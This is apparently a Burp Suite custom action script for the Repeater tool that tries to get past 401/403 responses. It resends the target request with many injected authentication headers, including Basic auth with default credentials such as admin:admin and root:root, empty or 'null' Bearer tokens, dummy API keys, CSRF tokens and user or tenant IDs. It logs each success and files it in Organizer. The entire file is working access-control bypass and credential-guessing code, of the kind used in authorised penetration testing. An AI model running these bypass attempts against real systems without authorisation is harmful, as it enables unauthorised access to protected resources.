id: b089c2e1-45f8-4b7b-9c6d-bypass-auth-001
name: 403/401 Bypass - Auth Headers
function: CUSTOM_ACTION
location: REPEATER
source: |+
  // 403/401 Bypass - Authentication Headers
  // Tests bypass using various auth-related headers
  
  int DELAY_MS = 50;
  boolean VERBOSE = true;
  
  String[][] AUTH_HEADERS = {
      {"Php-Auth-User", "admin"},
      {"Php-Auth-User", "root"},
      {"Php-Auth-User", "administrator"},
      {"Php-Auth-Pw", "admin"},
      {"Php-Auth-Pw", "password"},
      {"Authorization", "Basic YWRtaW46YWRtaW4="},
      {"Authorization", "Basic cm9vdDpyb290"},
      {"Authorization", "Basic YWRtaW46cGFzc3dvcmQ="},
      {"Authorization", "Bearer "},
      {"Authorization", "Bearer A"},
      {"Authorization", "Bearer null"},
      {"Authorization", "Bearer undefined"},
      {"X-CSRFToken", "DECAFC0FFEEBAD"},
      {"X-Csrf-Token", "DECAFC0FFEEBAD"},
      {"X-XSRF-Token", "DECAFC0FFEEBAD"},
      {"X-Request-ID", "1234567890"},
      {"X-Correlation-ID", "f058ebd6-02f7-4d3f-942e-904344e8cde5"},
      {"X-Auth-Token", "admin"},
      {"X-Auth-Token", "null"},
      {"X-API-Key", "admin"},
      {"X-API-Key", "null"},
      {"Siteid", "0"},
      {"Siteid", "1"},
      {"Siteid", "-1"},
      {"X-Tenant-ID", "0"},
      {"X-Tenant-ID", "1"},
      {"X-User-ID", "0"},
      {"X-User-ID", "1"},
      {"X-User-ID", "admin"}
  };
  
  var originalRequest = requestResponse.request();
  var httpService = requestResponse.httpService();
  int originalStatus = requestResponse.response().statusCode();
  
  logging.logToOutput("=== 403/401 Bypass - Auth Headers ===");
  logging.logToOutput("Target: " + httpService.host() + originalRequest.path());
  logging.logToOutput("Original Status: " + originalStatus);
  logging.logToOutput("");
  
  int total = 0, success = 0;
  
  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);

  for (String[] headerPair : AUTH_HEADERS) {
      try {
          var req = originalRequest.withHeader(headerPair[0], headerPair[1]);
          var resp = api.http().sendRequest(req);
          Thread.sleep(DELAY_MS);
          
          int status = resp.response().statusCode();
          String note = headerPair[0] + ": " + headerPair[1] + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              success++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
              rr.annotations().setNotes("Auth Header Bypass: " + note);
              api.organizer().sendToOrganizer(rr);
          } else if (VERBOSE) {
              logging.logToOutput("[-] " + note);
          }
          total++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  logging.logToOutput("");
  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
